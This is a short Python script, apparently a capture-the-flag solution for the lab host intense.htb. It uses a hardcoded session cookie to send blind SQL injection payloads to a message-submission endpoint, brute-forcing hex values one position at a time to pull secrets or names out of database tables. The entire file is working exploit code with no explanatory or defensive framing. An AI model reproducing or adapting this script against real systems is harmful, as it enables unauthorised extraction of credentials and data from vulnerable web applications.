import requests

cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE="
url = "http://intense.htb/submitmessage"
cookies = dict(auth=cookie)


'''
front = "'||(SELECT(CASE WHEN "
mid ="=(SELECT hex(substr(secret,"
back=",1)) from users Limit 1) THEN '' ELSE (SELECT 1 from users LIMIT 1 OFFSET .2)END)));--"
'''
front="'||(Select(CASE \""
mid = "\"=(SELECT hex(substr(name,"
back=",1)) from names limit 1 offset 1) WHEN 1 THEN '' ELSE (SELECT 1 from names LIMIT 1 OFFSET .2)END)));--"


for pos in range(1,65):
    loc = str(pos)
    for hx in range(0,256):
        guess = hex(hx)[2:].upper()
        if (hx <= 15):
            guess = "0"+guess
        cur = front + guess + mid + loc + back
        '''
        print("\tguess: " + guess)
        print("\t\turl: "+cur)
        '''
        payload = {'message': cur}
        response = requests.post(url, data=payload,cookies=cookies)
        ret = response.text
        '''
        print(ret)
        '''
        if ("OK" in ret):
            print(guess,end='')
            break;
